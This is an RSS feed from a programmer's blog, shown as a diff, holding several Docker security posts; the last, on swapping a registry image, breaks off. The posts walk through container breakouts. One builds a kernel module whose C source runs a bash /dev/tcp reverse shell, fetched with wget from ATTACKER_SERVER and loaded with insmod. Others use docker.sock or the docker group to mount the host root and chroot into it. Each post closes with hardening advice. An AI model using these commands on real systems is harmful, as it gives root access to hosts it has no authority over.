@@ -1,0 +1,822 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Jan Górkiewicz - Programmer Technical Blog</title><link>/posts/</link><description>Recent content in Posts on Jan Górkiewicz - Programmer Technical Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 25 Dec 2020 18:51:20 +0100</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>How to add Reverseshell to host from the privileged container</title><link>/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/</link><pubDate>Fri, 25 Dec 2020 18:51:20 +0100</pubDate><guid>/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/</guid><description>Overview Docker privileged mode grants a Docker container root capabilities to all devices on the host system. Some docker containers require extra privileges to access kernel host (e.g. to allow run docker inside docker). Unfortunately, these root capabilities can be also used to breakout container and even gain root capabilities.
+Preconditions The attacker has access to the container with --privileged or --cap-add=all mode Checking capabilities First, to simulate the attacker situation let&amp;rsquo;s run the alpine image with --privileged mode.</description><content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Docker privileged mode grants a Docker container root capabilities to all devices on the host system. Some docker containers require extra privileges to access kernel host (e.g. to allow run docker inside docker). Unfortunately, these root capabilities can be also used to breakout container and even gain root capabilities.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The attacker has access to the container with <code>--privileged</code> or <code>--cap-add=all</code> mode</li>
+</ul>
+<h2 id="checking-capabilities">Checking capabilities</h2>
+<p>First, to simulate the attacker situation let&rsquo;s run the alpine image with <code>--privileged</code> mode.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it --privileged alpine sh
+</code></pre></div><p>The next step for the attacker is to check what capabilities are available in a docker container. To do that it is needed to run <code>capsh --print</code> the command inside the container. if the command is not available it is needed to install <code>libcap</code> library.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apk add -U libcap
+capsh --print | grep Current
+</code></pre></div><p>Result:</p>
+<pre><code class="language-console" data-lang="console">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+</code></pre><p>As you see there are a lot of capabilities in a privileged mode, Below you can find differences between the privileged component and the standard one.</p>
+<table>
+<thead>
+<tr>
+<th>NORMAL</th>
+<th>PRIVILEGED</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cap_chown</td>
+<td>cap_chown</td>
+</tr>
+<tr>
+<td>cap_dac_override</td>
+<td>cap_dac_override</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_dac_read_search</td>
+</tr>
+<tr>
+<td>cap_fowner</td>
+<td>cap_fowner</td>
+</tr>
+<tr>
+<td>cap_fsetid</td>
+<td>cap_fsetid</td>
+</tr>
+<tr>
+<td>cap_kill</td>
+<td>cap_kill</td>
+</tr>
+<tr>
+<td>cap_setgid</td>
+<td>cap_setgid</td>
+</tr>
+<tr>
+<td>cap_setuid</td>
+<td>cap_setuid</td>
+</tr>
+<tr>
+<td>cap_setpcap</td>
+<td>cap_setpcap</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_linux_immutable</td>
+</tr>
+<tr>
+<td>cap_net_bind_service</td>
+<td>cap_net_bind_service</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_net_broadcast</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_net_admin</td>
+</tr>
+<tr>
+<td>cap_net_raw</td>
+<td>cap_net_raw</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_ipc_lock</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_ipc_owner</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>cap_sys_module</strong></td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_rawio</td>
+</tr>
+<tr>
+<td>cap_sys_chroot</td>
+<td>cap_sys_chroot</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>cap_sys_ptrace</strong></td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_pacct</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>cap_sys_admin</strong></td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_boot</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_nice</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_resource</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_time</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_sys_tty_config</td>
+</tr>
+<tr>
+<td>cap_mknod</td>
+<td>cap_mknod</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_lease</td>
+</tr>
+<tr>
+<td>cap_audit_write</td>
+<td>cap_audit_write</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_audit_control</td>
+</tr>
+<tr>
+<td>cap_setfcap+eip</td>
+<td>cap_setfcap</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_mac_override</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_mac_admin</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_syslog</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_wake_alarm</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_block_suspend</td>
+</tr>
+<tr>
+<td></td>
+<td>cap_audit_read+eip</td>
+</tr>
+</tbody>
+</table>
+<p><strong>cap_sys_module</strong>, <strong>cap_sys_ptrace</strong>, <strong>cap_sys_admin</strong> are capabilities which attacker can easily use to breakout container.</p>
+<hr>
+<h2 id="building-reverse-shell-kernel-module">Building reverse shell kernel module</h2>
+<p>With privileged docker container attacker can install linux kernel modules. In this section we build reverseshell kernel module.</p>
+<p>Before start creating kernel module you have to be sure that you have installed <strong>linux headers</strong>. To install them use command below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install -y build-essential linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
+</code></pre></div><p>Next step we need to do is create file <code>reverseshell_module.c</code> with content below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kmod.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> command[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/172.17.0.1/8888 0&gt;&amp;1&#34;</span>; <span style="color:#75715e">//Reverse shell change ip and port if needed
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#34;/bin/bash&#34;</span>,
+    <span style="color:#e6db74">&#34;-c&#34;</span>,    <span style="color:#75715e">// flag make command run from option list
+</span><span style="color:#75715e"></span>    command, <span style="color:#75715e">// Reverse shell
+</span><span style="color:#75715e"></span>    NULL     <span style="color:#75715e">// End of the list
+</span><span style="color:#75715e"></span>};
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#34;HOME=/&#34;</span>,
+    NULL <span style="color:#75715e">// End of the list
+</span><span style="color:#75715e"></span>};
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">connect_back_init</span>(<span style="color:#66d9ef">void</span>)
+{
+
+    <span style="color:#66d9ef">return</span> call_usermodehelper(
+        argv[<span style="color:#ae81ff">0</span>],      <span style="color:#75715e">// execution path
+</span><span style="color:#75715e"></span>        argv,         <span style="color:#75715e">// arguments for process
+</span><span style="color:#75715e"></span>        envp,         <span style="color:#75715e">// environment for process
+</span><span style="color:#75715e"></span>        UMH_WAIT_EXEC <span style="color:#75715e">// don&#39;t wait for program return status
+</span><span style="color:#75715e"></span>    );
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">connect_back_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+    printk(KERN_INFO <span style="color:#e6db74">&#34;Exiting</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(connect_back_init);
+module_exit(connect_back_exit);
+</code></pre></div><p>Next step is to prepare <code>Makefile</code> to be able to build module properly:</p>
+<pre><code>obj-m += reverseshell_module.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
+
+</code></pre><p>When both files are prepared you can build file with <code>make</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">make
+</code></pre></div><p>result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">make -C /lib/modules/5.4.0-42-generic/build M<span style="color:#f92672">=</span>/home/janek/reverseshell modules
+make<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Entering directory <span style="color:#e6db74">&#39;/usr/src/linux-headers-5.4.0-42-generic&#39;</span>
+  Building modules, stage 2.
+  MODPOST <span style="color:#ae81ff">1</span> modules
+WARNING: modpost: missing MODULE_LICENSE<span style="color:#f92672">()</span> in /home/janek/reverseshell/reverseshell_module.o
+see include/linux/module.h <span style="color:#66d9ef">for</span> more information
+  CC <span style="color:#f92672">[</span>M<span style="color:#f92672">]</span>  /home/janek/reverseshell/reverseshell_module.mod.o
+  LD <span style="color:#f92672">[</span>M<span style="color:#f92672">]</span>  /home/janek/reverseshell/reverseshell_module.ko
+make<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Leaving directory <span style="color:#e6db74">&#39;/usr/src/linux-headers-5.4.0-42-generic&#39;</span>
+</code></pre></div><p>As build process has been completed attacker can put <code>reverseshell_module.ko</code> into some http server.</p>
+<h2 id="installing-a-reverse-shell-kernel-module-from-the-privileged-docker-container">Installing a reverse shell kernel module from the privileged docker container</h2>
+<p>Let&rsquo;s go back to a privileged Docker container which attacker got access.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it --privileged alpine sh
+</code></pre></div><p>Another thing attacker do is downloading prepared docker module.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://ATTACKER_SERVER/reverseshell_module.ko
+</code></pre></div><pre><code class="language-console" data-lang="console">Connecting to 172.17.0.1:8000 (172.17.0.1:8000)
+saving to 'reverseshell_module.ko'
+reverseshell_module. 100% |********************************************************|  4544  0:00:00 ETA
+'reverseshell_module.ko' saved
+</code></pre><p>Before installation of the kernel module, it is needed to setup <code>netcat</code> listener in a new terminal window:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp <span style="color:#ae81ff">8888</span>
+</code></pre></div><p>result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Listening on 0.0.0.0 <span style="color:#ae81ff">8888</span>
+</code></pre></div><p>As the listener is ready attacker can install reverse shell kernel module:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x reverseshell_module.ko
+insmod reverseshell_module.ko
+</code></pre></div><p>The connection should appear on the listening terminal:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Connection received on 10.0.2.15 <span style="color:#ae81ff">44586</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+root@docker:/# id
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@docker:/# 
+</code></pre></div><p>As we can see the attacker received <strong>root</strong> access on the host machine.</p>
+<h3 id="kernel-modules-commands">Kernel modules commands</h3>
+<p>Below you can find some useful command for managing kernel modules:</p>
+<p>Install module:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">insmod reverseshell_module.ko
+</code></pre></div><p>Unload module:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rmmod reverseshell_module.ko
+</code></pre></div><p>List modules:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lsmod
+</code></pre></div><h2 id="how-to-secure">How to secure?</h2>
+<ul>
+<li>Always give the container minimum requirements it needs</li>
+<li>If it is required add only specific capabilities with <code>--cap-add</code></li>
+<li>Use namespace remapping</li>
+<li>Run docker in <a href="https://docs-stage.docker.com/engine/security/rootless/">rootless mode</a> (Some docker features may not work properly)</li>
+<li>Run containers as not <code>root</code> user</li>
+</ul>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://phoenixnap.com/kb/docker-privileged">https://phoenixnap.com/kb/docker-privileged</a></li>
+<li><a href="https://www.educba.com/docker-privileged/">https://www.educba.com/docker-privileged/</a></li>
+<li><a href="https://docs-stage.docker.com/engine/security/rootless/">https://docs-stage.docker.com/engine/security/rootless/</a></li>
+<li><a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html</a></li>
+<li><a href="https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-init-again.html">https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-init-again.html</a></li>
+<li><a href="https://www.thegeekstuff.com/2013/07/write-linux-kernel-module/">https://www.thegeekstuff.com/2013/07/write-linux-kernel-module/</a></li>
+</ul>
+]]></content></item><item><title>Docker Container breakout using docker.sock</title><link>/posts/docker-container-breakout-using-docker.sock/</link><pubDate>Thu, 24 Dec 2020 18:51:20 +0100</pubDate><guid>/posts/docker-container-breakout-using-docker.sock/</guid><description>Overview Some docker images like Portainer, Nginx available on docker hub require add as volume docker.sock. This file allows managing other containers from the container. Unfortunately, access to this file can also give the attacker opportunity to get control over the host.
+Preconditions The attacker got access to docker container Container has mounted /var/run/docker.sock Checking if conditions fulfilled To simulate precondition we create alpine image with mounted docker.sock:</description><content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Some docker images like <strong>Portainer</strong>, <strong>Nginx</strong> available on docker hub require add as volume <code>docker.sock</code>. This file allows managing other containers from the container. Unfortunately, access to this file can also give the attacker opportunity to get control over the host.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The attacker got access to docker container</li>
+<li>Container has mounted <code>/var/run/docker.sock</code></li>
+</ul>
+<h2 id="checking-if-conditions-fulfilled">Checking if conditions fulfilled</h2>
+<p>To simulate precondition we create <code>alpine image</code> with mounted <code>docker.sock</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
+</code></pre></div><p>Let be sure if docker sock has been mounted:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls /var/run/docker.sock 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/run/docker.sock
+</code></pre></div><p>Another thing user need to check if <code>docker</code> CLI is installed under container:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker
+</code></pre></div><p>Result:</p>
+<pre><code class="language-console" data-lang="console">sh: docker: not found
+</code></pre><p>Docker command was not found so it is needed to install it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apk update
+apk add -U docker
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/ <span style="color:#75715e"># apk update</span>
+fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
+fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
+v3.12.1-34-g3bbb400149 <span style="color:#f92672">[</span>http://dl-cdn.alpinelinux.org/alpine/v3.12/main<span style="color:#f92672">]</span>
+v3.12.1-37-gb1aa03461c <span style="color:#f92672">[</span>http://dl-cdn.alpinelinux.org/alpine/v3.12/community<span style="color:#f92672">]</span>
+OK: <span style="color:#ae81ff">12750</span> distinct packages available
+/ <span style="color:#75715e"># apk add -U docker</span>
+<span style="color:#f92672">(</span>1/12<span style="color:#f92672">)</span> Installing ca-certificates <span style="color:#f92672">(</span>20191127-r4<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>2/12<span style="color:#f92672">)</span> Installing libseccomp <span style="color:#f92672">(</span>2.4.3-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>3/12<span style="color:#f92672">)</span> Installing runc <span style="color:#f92672">(</span>1.0.0_rc10-r1<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>4/12<span style="color:#f92672">)</span> Installing containerd <span style="color:#f92672">(</span>1.3.4-r1<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>5/12<span style="color:#f92672">)</span> Installing libmnl <span style="color:#f92672">(</span>1.0.4-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>6/12<span style="color:#f92672">)</span> Installing libnftnl-libs <span style="color:#f92672">(</span>1.1.6-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>7/12<span style="color:#f92672">)</span> Installing iptables <span style="color:#f92672">(</span>1.8.4-r2<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>8/12<span style="color:#f92672">)</span> Installing tini-static <span style="color:#f92672">(</span>0.19.0-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>9/12<span style="color:#f92672">)</span> Installing device-mapper-libs <span style="color:#f92672">(</span>2.02.186-r1<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>10/12<span style="color:#f92672">)</span> Installing docker-engine <span style="color:#f92672">(</span>19.03.12-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>11/12<span style="color:#f92672">)</span> Installing docker-cli <span style="color:#f92672">(</span>19.03.12-r0<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>12/12<span style="color:#f92672">)</span> Installing docker <span style="color:#f92672">(</span>19.03.12-r0<span style="color:#f92672">)</span>
+Executing docker-19.03.12-r0.pre-install
+Executing busybox-1.31.1-r16.trigger
+Executing ca-certificates-20191127-r4.trigger
+OK: <span style="color:#ae81ff">307</span> MiB in <span style="color:#ae81ff">26</span> packages 
+</code></pre></div><h2 id="escaping-docker-container">Escaping docker container</h2>
+<p>Having mounted <code>docker.sock</code> we have full access to managing docker containers. So we can: delete, exec, create, change configurations etc.</p>
+<p>Our next step would be <strong>creating a new container</strong> with the mounted <strong>root directory</strong> as volume:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker -H unix://var/run/docker.sock run -it -v /:/host -t alpine sh
+</code></pre></div><p>Let&rsquo;s now use <code>chroot</code> command over host directory</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chroot host
+</code></pre></div><p>Attacker gain <strong>full access to file system on the host</strong> directory.</p>
+<h3 id="how-to-secure">How to secure?</h3>
+<ul>
+<li>Do not mount <code>/var/run/docker.sock</code></li>
+<li>If you need to mount into some containers treat it as root privileged application, secure it, try not to expose over the network</li>
+<li>Run docker in <a href="https://docs-stage.docker.com/engine/security/rootless/">rootless mode</a> (Some docker features may not work properly)</li>
+</ul>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DockerSecurityCheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/DockerSecurityCheat_Sheet.html</a></li>
+</ul>
+]]></content></item><item><title>Docker privilege escalation - Namespace Exploit</title><link>/posts/docker-privilege-escalation-namespace-exploit/</link><pubDate>Tue, 22 Dec 2020 18:51:20 +0100</pubDate><guid>/posts/docker-privilege-escalation-namespace-exploit/</guid><description>Overview Docker for proper running need root privileges. Following the Peter Parker quote &amp;quot;With great power comes great responsibility&amp;quot; we should focus on securing potential docker vulnerabilities. One of them is Privilege Escalation through Linux Namespace.
+Preconditions Already logged user in the host User in the docker group userns-remap disabled Attack - User with docker group on the host machine In the beginning, it is required to check if we are added to docker user group, so we can run docker command.</description><content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Docker for proper running need <strong>root</strong> privileges. Following the Peter Parker quote <em>&quot;<strong>With great power comes great responsibility</strong>&quot;</em> we should focus on securing potential docker vulnerabilities. One of them is <strong>Privilege Escalation through Linux Namespace</strong>.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>Already logged user in the host</li>
+<li>User in the docker group</li>
+<li><code>userns-remap</code> disabled</li>
+</ul>
+<h2 id="attack---user-with-docker-group-on-the-host-machine">Attack - User with docker group on the host machine</h2>
+<p>In the beginning, it is required to check if we are added to <code>docker</code> user group, so we can run docker command. There are many commands to do that like: <code>id</code>, <code>groups</code> but the easiest way is just run <code>docker</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  ~ groups
+janek adm sudo docker
+</code></pre></div><p>To gain root privileges on the host machine it is needed to create or use a container with root mount <code>/</code> directory and run <code>chroot</code> command over <code>host</code> catalogue in the container.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it --rm -v /:/host alpine chroot /host
+</code></pre></div><p>Result of the command should look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  ~ docker run -it --rm -v /:/host alpine chroot /host
+To run a command as administrator <span style="color:#f92672">(</span>user <span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">)</span>, use <span style="color:#e6db74">&#34;sudo &lt;command&gt;&#34;</span>.
+See <span style="color:#e6db74">&#34;man sudo_root&#34;</span> <span style="color:#66d9ef">for</span> details.
+
+root@bf63f8813122:/# 
+</code></pre></div><p><code>chroot</code> change working root directory for the current process. In this case, it means that the user gains full privileges on the host.</p>
+<pre><code class="language-console" data-lang="console">root@bf63f8813122:/# docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS               NAMES
+bf63f8813122        alpine              &quot;chroot /host&quot;      About a minute ago   Up About a minute                       xenodochial_torvalds
+root@bf63f8813122:/# cd root
+root@bf63f8813122:~# id
+</code></pre><h2 id="how-to-secure">How to secure?</h2>
+<ul>
+<li>Add only privileged users to <code>docker</code> group</li>
+<li>Use <code>userns-remap</code></li>
+<li>Run docker in <a href="https://docs-stage.docker.com/engine/security/rootless/">rootless mode</a> (Some docker features may not work properly)</li>
+</ul>
+<h3 id="setting-up-remapping-of-the-user-namespace">Setting up remapping of the user namespace</h3>
+<p>Before we start the remap procedure we need to stop <strong>docker</strong> with all containers reset.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker container stop <span style="color:#66d9ef">$(</span>docker container ls -aq<span style="color:#66d9ef">)</span>
+sudo systemctl stop docker
+</code></pre></div><p>Open (If doesn&rsquo;t' exists create one) <code>/etc/docker/daemon.json</code> and put the parameter :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;userns-remap&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>
+}
+</code></pre></div><p>The phrase above add namespace mapping with a default value <code>dockremap</code> every time docker daemon start.</p>
+<p>Then we have to restart docker service and reboot</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo systemctl start docker
+</code></pre></div><p>After this procedure <code>root</code> under the container is mapped to <code>dockremap</code> user on the host.</p>
+<h3 id="sources">Sources</h3>
+<ul>
+<li><a href="https://docs-stage.docker.com/engine/security/userns-remap/">https://docs-stage.docker.com/engine/security/userns-remap/</a></li>
+<li><a href="https://docs.docker.com/engine/reference/commandline/dockerd/">https://docs.docker.com/engine/reference/commandline/dockerd/</a></li>
+</ul>
+]]></content></item><item><title>How to swap an image in docker registry - with rigged image</title><link>/posts/how-to-swap-an-image-in-docker-registry-with-rigged-image/</link><pubDate>Mon, 21 Dec 2020 18:51:20 +0100</pubDate><guid>/posts/how-to-swap-an-image-in-docker-registry-with-rigged-image/</guid><description>Overview Docker registry mechanism allows to quick download images from the image repository. This makes the publish/pull processes much easier. Unfortunately, this great feature can open new possibilities to an attacker who can corrupt the image in the registry.
+In this scenario, we assume that the attacker already got write access to the docker image repository (Like public one docker hub or steal developer&amp;rsquo;s/Jenkins&amp;rsquo;s credentials to the private docker registry)</description><content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Docker registry mechanism allows to quick download images from the image repository. This makes the publish/pull processes much easier. Unfortunately, this great feature can open new possibilities to an attacker who can <strong>corrupt the image in the registry</strong>.</p>
+<p>In this scenario, we assume that the attacker already <strong>got write access to the docker image repository</strong> (Like public one <a href="https://hub.docker.com/">docker hub</a> or steal developer&rsquo;s/Jenkins&rsquo;s credentials to the private docker registry)</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The attacker has to have write access to the docker repository</li>
+<li>No app signature checks applied</li>
+</ul>
+<h2 id="how-to-change-docker-images">How to change docker images</h2>
+<p>Docker registry structure of locating images look like that:</p>
+<pre><code class="language-console" data-lang="console">repository/image:tag
+</code></pre><p>Let assume we have a private registry with image <code>busybox</code> with tag <code>latest</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker push localhost:5000/busybox
+</code></pre></div><pre><code class="language-console" data-lang="console">The push refers to repository [localhost:5000/busybox]
+d2421964bad1: Pushed
+latest: digest: sha256:c9249fdf56138f0d929e2080ae98ee9cb2946f71498fc1484288e6a935b5e5bc size: 527
+</code></pre><p>As you see tag name is <code>latest</code> and Digest of the current image starts with <code>c9249fd</code></p>
+<p>Next step to be done is to take the rigged image and send it as <code>busybox</code> with tag <code>latest</code></p>
+<p>Let&rsquo;s remove the current <code>busybox</code> image from local repo and rename <code>alpine</code> image to <code>busybox</code> and push into our registry</p>
